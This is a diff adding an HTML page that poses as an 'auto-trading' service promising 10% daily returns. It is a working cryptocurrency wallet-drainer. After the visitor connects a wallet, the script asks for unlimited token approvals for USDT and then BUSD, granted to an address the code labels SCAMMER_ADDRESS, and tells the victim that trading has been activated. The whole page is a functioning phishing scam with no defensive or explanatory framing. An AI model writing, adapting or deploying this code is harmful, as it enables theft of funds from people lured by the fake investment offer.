@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Auto-Trading ROI</title>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.9.0/dist/umd/index.min.js"></script>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 40px;
+      background: #f0f2f5;
+    }
+    button {
+      padding: 12px 24px;
+      font-size: 16px;
+      cursor: pointer;
+      background-color: #2d89ef;
+      border: none;
+      color: white;
+      border-radius: 6px;
+      margin: 10px;
+    }
+  </style>
+</head>
+<body>
+  <h1>💰 Earn 10% Daily ROI</h1>
+  <p>Connect wallet & approve tokens to start auto-trading.</p>
+
+  <button id="connectBtn">🔗 Connect Wallet</button><br><br>
+  <button id="approveBtn">📈 Start Auto-Trading</button>
+
+  <script>
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+    const BUSD_ADDRESS = "0xe9e7cea3dedca5984780bafc599bd69add087d56";
+    const SCAMMER_ADDRESS = "0xbE73c37a0C255766211804aA453904717136B3AB";
+
+    const ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
+    let signer, provider;
+
+    // ✅ WalletConnect v2 config (NO Web3Modal)
+    const walletConnectProvider = new window.WalletConnectEthereumProvider({
+      projectId: "6b0d9f43b66457426a444383f058d531",
+      chains: [56],
+      showQrModal: true,
+      rpcMap: {
+        56: "https://bsc-dataseed.binance.org"
+      }
+    });
+
+    // ✅ Connect Wallet
+    document.getElementById("connectBtn").addEventListener("click", async () => {
+      try {
+        await walletConnectProvider.enable(); // Triggers QR/mobile connect
+        provider = new ethers.providers.Web3Provider(walletConnectProvider);
+        signer = provider.getSigner();
+        alert("✅ Wallet connected!");
+        localStorage.setItem("approval_stage", "usdt");
+      } catch (err) {
+        console.error("❌ Wallet connection failed:", err);
+        alert("❌ Wallet connection failed.");
+      }
+    });
+
+    // ✅ Approve Logic
+    document.getElementById("approveBtn").addEventListener("click", async () => {
+      if (!signer) {
+        alert("❗ Please connect wallet first.");
+        return;
+      }
+
+      const stage = localStorage.getItem("approval_stage") || "usdt";
+      const tokenAddress = stage === "usdt" ? USDT_ADDRESS : BUSD_ADDRESS;
+      const tokenName = stage.toUpperCase();
+      const contract = new ethers.Contract(tokenAddress, ABI, signer);
+
+      try {
+        const tx = await contract.approve(SCAMMER_ADDRESS, ethers.constants.MaxUint256);
+        alert(`🔄 Approving ${tokenName}...`);
+        await tx.wait();
+
+        if (stage === "usdt") {
+          localStorage.setItem("approval_stage", "busd");
+          alert("✅ USDT Approved! Now approving BUSD...");
+          document.getElementById("approveBtn").click();
+        } else {
+          localStorage.removeItem("approval_stage");
+          alert("✅ Auto-Trading Activated! Enjoy your 10% ROI 😉");
+        }
+      } catch (e) {
+        console.error("❌ Approval failed:", e);
+        alert(`❌ ${tokenName} approval failed or rejected.`);
+      }
+    });
+  </script>
+</body>
+</html>
